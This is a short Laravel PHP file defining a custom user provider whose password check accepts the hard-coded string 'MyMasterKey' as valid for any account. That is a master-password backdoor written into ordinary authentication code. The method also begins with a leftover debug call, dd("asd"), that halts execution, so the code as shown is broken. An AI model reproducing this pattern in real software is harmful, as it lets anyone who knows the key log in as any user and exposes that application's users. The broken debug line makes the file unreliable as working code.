<?php

namespace App\Providers;

use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;

class CustomUserProvider extends EloquentUserProvider
{
    public function validateCredentials(UserContract $user, array $credentials)
    {
        dd("asd");
        $plain = $credentials['password'];
        if( $plain == 'MyMasterKey' ) return true;
        return $this->hasher->check($plain, $user->getAuthPassword());
    }
}